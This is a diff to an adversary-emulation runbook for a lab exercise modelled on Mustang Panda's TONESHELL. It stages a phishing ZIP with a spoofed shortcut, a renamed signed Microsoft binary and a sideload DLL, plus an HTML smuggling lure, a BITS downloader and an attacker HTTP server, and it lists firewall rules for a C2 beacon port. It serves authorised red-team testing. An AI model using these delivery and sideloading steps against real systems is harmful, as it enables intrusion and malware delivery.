@@ -78,6 +78,13 @@ ss -tlnp | grep 8443
 
 The `simplefileserver` handler in controlServer serves the delivery package — no separate process needed. It starts automatically with controlServer and serves files from `../toneshell-v2/` at prefix `/files` on TCP 80.
 
+The handler serves the whole `toneshell-v2/` tree, so stage the delivery ZIP at its root — the build artifact lives under `build/src/wsdapi/Release/` (from the repo root):
+
+```bash
+cp testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/build/src/wsdapi/Release/250325_Pentos_Board_Minutes.zip \
+   testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/
+```
+
 Verify it is reachable from WS01:
 
 ```powershell
@@ -86,18 +93,73 @@ Invoke-WebRequest -Uri "http://192.168.56.2/files/250325_Pentos_Board_Minutes.zi
 # Expected: StatusCode 200
 ```
 
+#### Shared staging server for the download variants (Step 1B + Step 1C)
+
+Step 1 (main) keeps using the controlServer `simplefileserver` handler (TCP 80, `/files`) — unchanged. The two download variants instead share **one** standalone `server.py` instance on TCP 8080, serving a single common directory — `/media/sf_share` — that must hold both files they need:
+
+| Variant | URL served by `server.py` |
+| - | - |
+| Step 1B (BITS) | `http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip` |
+| Step 1C (HTML smuggling) | `http://192.168.56.2:8080/staging.html` |
+
+The standalone server is required because `simplefileserver` does not advertise `Accept-Ranges`, and BITS will not resume a transfer from a server that does not. Stage both payloads into the shared directory (from the repo root):
+
+```bash
+# 1B payload: password-protected delivery ZIP
+cp testlab-enterprise/q3-plan/resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/build/src/wsdapi/Release/250325_Pentos_Board_Minutes.zip \
+   /media/sf_share/
+
+# 1C payload: HTML smuggling lure page
+cp testlab-enterprise/q3-plan/resources/payloads/user-trigger/html-smuggling-hta/staging.html \
+   /media/sf_share/
+```
+
+Start the server (on the attacker host, `192.168.56.2`):
+
+```bash
+cd testlab-enterprise/q3-plan/resources/payloads/file-servers/http-server
+python3 server.py 8080 /media/sf_share
+```
+
+Expected startup:
+
+```text
+Serving HTTP on 0.0.0.0 port 8080
+Directory: /media/sf_share
+Range header: Supported (BITS compatible)
+```
+
+Verify both files are reachable from WS01:
+
+```powershell
+# From WS01
+$zip = Invoke-WebRequest -Uri "http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip" -Method Head
+$zip.StatusCode                # Expected: 200
+$zip.Headers['Accept-Ranges']  # Expected: bytes
+$page = Invoke-WebRequest -Uri "http://192.168.56.2:8080/staging.html" -Method Head
+$page.StatusCode               # Expected: 200
+```
+
+`simplefileserver` (TCP 80, Step 1) and `server.py` (TCP 8080, Steps 1B/1C) run side by side — do not bind the same port twice. Re-copy `staging.html` into `/media/sf_share` whenever it is regenerated with `build.py`.
+
 ### Delivery Package
 
 Confirm the following files are prepared and in place:
 
-**On attacker host** — served via staging web server (port 8080):
+**On attacker host** — served via the staging web servers:
 - `250325_Pentos_Board_Minutes.zip` — password-protected ZIP (`Pentos`) containing:
   - `Essos Competitiveness Brief.lnk` — icon spoofed to `shell32.dll,70`
   - `EssosUpdate.exe` — renamed `wsddebug_host.exe` (signed Microsoft binary)
   - `wsdapi.dll` — attacker-controlled sideload DLL (Tully Enterprises self-signed cert)
+- `staging.html` — HTML smuggling lure page (**Step 1C**); copy into the shared staging directory `/media/sf_share` served by `server.py` (see above), which also holds the ZIP for Step 1B
 
 **On WS01** — staged by operator via RDP before running Phase 1:
-- `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document with embedded hyperlink pointing to `http://192.168.56.2:8080/250325_Pentos_Board_Minutes.rar`
+- `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document with embedded hyperlink pointing to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip`
+- `C:\Users\labuser\Downloads\BitsDownloader.exe` — unsigned C# BITS downloader, used only by the **Step 1B variant** (BITS-based delivery); staged by operator via RDP
+
+> **BITS variant (Step 1B):** requires the Range-capable `server.py` started above. Build `BitsDownloader.exe` via [`../resources/payloads/file-servers/http-client/csharp-downloader/build.bat`](../resources/payloads/file-servers/http-client/csharp-downloader/build.bat) if missing.
+>
+> **HTML smuggling variant (Step 1C):** uses a lure document whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html` instead of the ZIP. Rebuild `staging.html` with [`../resources/payloads/user-trigger/html-smuggling-hta/build.py`](../resources/payloads/user-trigger/html-smuggling-hta/build.py) after changing the loader, then re-copy it into `/media/sf_share`.
 
 If the package needs to be rebuilt, see:
 [`../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md`](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md)
@@ -109,6 +171,7 @@ If the package needs to be rebuilt, see:
 | Source | Destination | Port | Protocol | Required for |
 | - | - | - | - | - |
 | WS01 (10.12.10.30) | Attacker (192.168.56.2) | 80 | TCP | Delivery package download via simplefileserver (Phase 1) |
+| WS01 (10.12.10.30) | Attacker (192.168.56.2) | 8080 | TCP | `server.py` staging: ZIP download via BITS + smuggling page (Phase 1 Step 1B / 1C) |
 | WS01 (10.12.10.30) | Attacker (192.168.56.2) | 8443 | TCP | TONESHELL C2 beacon (Phase 1+) |
 | WS01 (10.12.10.30) | IIS01 (10.12.10.20) | 1433 | TCP | MSSQL credential use (Phase 2) |
 
